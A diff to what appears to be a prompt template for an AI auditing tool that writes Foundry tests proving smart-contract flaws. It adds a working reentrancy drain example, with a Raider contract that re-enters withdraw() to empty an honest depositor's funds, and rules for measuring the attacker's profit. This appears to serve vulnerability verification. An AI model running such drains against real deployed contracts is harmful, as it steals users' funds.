@@ -32,11 +32,17 @@ Hard rules:
 - The test MUST fail if the flaw is not real. No skipping, no `vm.assume` around the bug.
 - Never fund the attacker and then call that profit. Set `profit` to the attacker's true net
   gain (end balance minus what they genuinely committed) and finish with `assertExploitLanded(floor)`.
+- `floor` is the amount `profit` must REACH OR EXCEED. Set it well below what you expect to
+  steal (e.g. if you expect to drain 5 ether, pass `1 ether`). You are proving it works, not
+  measuring it exactly.
+- Keep it MINIMAL. No `assertEq` sanity checks, no `console.log`, no constants you reference
+  from another contract, no elaborate setup. Deploy, seed one honest balance, attack, set
+  `profit`, assert. Every extra line is a chance to introduce a compile error.
 - Deploy the victim yourself for local cases; for fork cases use `vm.createSelectFork` and the
   real addresses from the lead.
 - One file. Solidity ^0.8.20. Exactly one external function `test_exploit`.
 
-Shape to follow:
+Worked example (a reentrancy drain — match this brevity):
 
     // SPDX-License-Identifier: MIT
     pragma solidity ^0.8.20;
@@ -44,18 +50,26 @@ Shape to follow:
     import {Victim} from "@contracts/<SubjectFile>.sol";
 
     contract Raider {
-        // attacker-controlled contract: callbacks, reentry, multi-step logic
+        Victim v;
+        constructor(Victim _v) payable { v = _v; }
+        function go() external { v.deposit{value: 1 ether}(); v.withdraw(); }
+        receive() external payable {
+            if (address(v).balance >= 1 ether) v.withdraw();
+        }
     }
 
     contract <ProofContract> is ExploitProof {
         function test_exploit() external {
             Victim v = new Victim();
-            // set up honest state (other users, liquidity)
-            Raider raider = new Raider(v);
-            noteAttackerStart(address(raider));
-            // run the attack
-            profit = address(raider).balance;   // or a token balance
-            assertExploitLanded(<floor>);
+            address alice = makeAddr("alice");
+            vm.deal(alice, 5 ether);
+            vm.prank(alice); v.deposit{value: 5 ether}();
+
+            Raider raider = new Raider{value: 1 ether}(v);
+            raider.go();
+
+            profit = address(raider).balance - 1 ether;  // net of what the attacker put in
+            assertExploitLanded(1 ether);                 // floor well below the ~5 ether drained
         }
     }
 """
